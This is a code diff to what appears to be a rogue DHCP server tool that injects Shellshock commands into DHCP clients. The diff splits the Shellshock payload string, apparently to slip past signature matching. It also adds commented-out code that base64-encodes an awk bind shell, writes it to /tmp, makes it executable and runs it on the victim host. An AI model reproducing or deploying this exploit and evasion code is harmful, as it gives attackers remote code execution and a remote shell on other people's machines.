@@ -5,6 +5,7 @@ from argparse import ArgumentParser
 from ipaddress import IPv4Address
 from scapy.all import BOOTP, DHCP, sniff
 from socket import socket, AF_PACKET, SOCK_RAW
+# from base64 import b64encode
 
 Base.check_user()
 
@@ -15,6 +16,9 @@ parser.add_argument('-f', '--first_offer_ip', type=str, required=True, help='Set
 parser.add_argument('-l', '--last_offer_ip', type=str, required=True, help='Set last client ip for offering')
 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
+# parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
+# parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)', default=1234)
+
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
 parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
@@ -41,7 +45,16 @@ number_of_dhcp_request = 0
 shellshock_url = None
 
 if args.shellshock_command is not None:
-    shellshock_url = "() { :; }; " + args.shellshock_command
+    shellshock_url = "() { :" + "; }; " + args.shellshock_command
+
+# bind_shell = "#!/bin/bash\r\nawk 'BEGIN{s=\"/inet/tcp/" + \
+#              str(args.bind_port) + \
+#              "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
+#
+# if args.bind_shell:
+#     b64encoded_shell = b64encode(bind_shell)
+#     shellshock_url = "() { :" + "; };echo " + b64encoded_shell + \
+#                      ">/tmp/s;echo '123'>/tmp/d;/usr/bin/base64 -d /tmp/s>/tmp/t;/bin/chmod 777 /tmp/t;/tmp/t;"
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
